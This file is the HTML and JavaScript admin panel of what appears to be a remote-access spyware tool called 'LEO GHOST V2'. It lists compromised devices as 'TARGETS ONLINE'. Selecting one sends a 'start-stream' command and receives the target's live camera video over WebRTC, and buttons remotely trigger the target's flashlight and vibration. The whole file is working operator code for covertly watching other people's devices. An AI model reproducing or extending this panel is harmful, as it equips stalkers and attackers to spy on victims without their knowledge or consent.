<!DOCTYPE html>
<html lang="en">
<head>
    <title>LEO GHOST V2 - ADMIN CONTROL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { background: #050a14; color: #00d4ff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
        #login-screen { position: fixed; inset: 0; background: #050a14; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .login-box { background: #0a192f; padding: 30px; border: 2px solid #00d4ff; border-radius: 15px; box-shadow: 0 0 20px #00d4ff55; text-align: center; }
        input { background: #112240; border: 1px solid #00d4ff; color: white; padding: 12px; border-radius: 5px; width: 250px; outline: none; margin-bottom: 15px; }
        button { background: #00d4ff; color: #050a14; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        #dashboard { display: grid; grid-template-columns: 280px 1fr; height: 100vh; visibility: hidden; }
        .sidebar { background: #0a192f; border-right: 1px solid #00d4ff33; padding: 20px; overflow-y: auto; }
        .user-item { background: #112240; padding: 15px; margin-bottom: 10px; border-radius: 8px; cursor: pointer; border: 1px solid transparent; }
        .user-item:hover { border-color: #00d4ff; }
        .user-item.active { background: #00d4ff; color: #050a14; font-weight: bold; }
        .main-view { padding: 20px; display: flex; flex-direction: column; align-items: center; position: relative; }
        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 2px solid #00d4ff; border-radius: 10px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .controls { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
        .btn-cmd { background: #112240; border: 1px solid #00d4ff; color: #00d4ff; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 0.8rem; }
        .hidden { display: none !important; }
        #loading-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 5; }
    </style>
    </head>
<body>

    <div id="login-screen">
        <div class="login-box">
            <h2>LEO GHOST V2</h2>
            <input type="password" id="pass" placeholder="Enter Admin Pin">
            <br>
            <button onclick="login()">AUTHORIZE</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="sidebar">
            <h2 style="font-size: 1rem;">TARGETS ONLINE</h2>
            <div id="user-list"></div>
        </div>

        <div class="main-view">
            <div style="width: 100%; margin-bottom: 10px; font-size: 0.8rem; color: #8892b0;">
                ID: <span id="current-id">None</span> | Status: <span id="status-text">Idle</span>
            </div>
            
            <div class="video-container">
                <div id="loading-overlay" class="hidden">Connecting to Stream...</div>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>

            <div class="controls">
                <button class="btn-cmd" onclick="sendCommand('flash')">Flashlight</button>
                <button class="btn-cmd" onclick="sendCommand('vibrate')">Vibrate</button>
                <button class="btn-cmd" onclick="location.reload()">Reset Panel</button>
            </div>
        </div>
    </div>
    <script>
        const socket = io();
        let currentTargetId = null;
        let peerConnection;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function login() {
            const pin = document.getElementById('pass').value;
            socket.emit('admin-join', pin);
        }

        socket.on('admin-status', (res) => {
            if(res.success) {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('dashboard').style.visibility = 'visible';
            } else { alert("Wrong Pin!"); }
        });

        socket.on('update-targets', (list) => {
            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = "";
            list.forEach((id) => {
                const div = document.createElement('div');
                div.className = `user-item ${currentTargetId === id ? 'active' : ''}`;
                div.innerText = `Device_${id.substring(0,4)}`;
                div.onclick = () => selectTarget(id);
                listDiv.appendChild(div);
            });
        });
        async function selectTarget(id) {
            currentTargetId = id;
            document.getElementById('current-id').innerText = id;
            document.getElementById('status-text').innerText = "Requesting Stream...";
            document.getElementById('loading-overlay').classList.remove('hidden');

            // Reset purana connection agar ho toh
            if(peerConnection) peerConnection.close();

            peerConnection = new RTCPeerConnection(config);
            
            peerConnection.onicecandidate = (event) => {
                if(event.candidate) {
                    socket.emit('signal', { to: currentTargetId, signal: { candidate: event.candidate } });
                }
            };

            peerConnection.ontrack = (event) => {
                console.log("Stream Received!");
                document.getElementById('remoteVideo').srcObject = event.streams[0];
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('status-text').innerText = "Live View";
            };

            // Command bhejo target ko ki stream start kare
            socket.emit('command', { targetId: currentTargetId, cmd: 'start-stream' });
        }

        socket.on('signal', async (data) => {
            if(data.from !== currentTargetId) return; // Sirf current target ka signal lo

            if(data.signal.sdp) {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
                if(data.signal.sdp.type === 'offer') {
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    socket.emit('signal', { to: data.from, signal: { sdp: answer } });
                }
            } else if(data.signal.candidate) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
        });
        function sendCommand(cmd) {
            if(!currentTargetId) return alert("Select a target first!");
            socket.emit('command', { targetId: currentTargetId, cmd: cmd });
        }
    </script>
</body>
</html>
